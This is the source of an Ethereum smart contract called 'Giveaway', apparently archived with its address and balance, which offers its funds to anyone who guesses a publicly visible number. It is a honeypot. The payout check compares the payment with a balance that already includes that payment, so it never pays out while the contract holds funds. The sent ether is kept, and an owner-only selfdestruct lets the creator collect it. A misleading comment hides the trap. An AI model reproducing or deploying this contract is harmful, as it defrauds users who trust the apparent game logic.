
//Address: 0x9f54d912a029380f2743aaf4ddd28c3f207cd719
//Contract name: Giveaway
//Balance: 0.08 Ether
//Verification Date: 3/18/2018
//Transacion Count: 2

// CODE STARTS HERE

pragma solidity ^0.4.21;
contract Giveaway {

    address private owner = msg.sender;
    uint public SecretNumber = 24;
   
    function() public payable {
    }
   
    function Guess(uint n) public payable {
        if(msg.value >= this.balance && n == SecretNumber && msg.value >= 0.07 ether) {
            // Previous Guesses makes the number easier to guess so you have to pay more
            msg.sender.transfer(this.balance + msg.value);
        }
    }
    
    function kill() public {
        require(msg.sender == owner);
	    selfdestruct(msg.sender);
	}
}
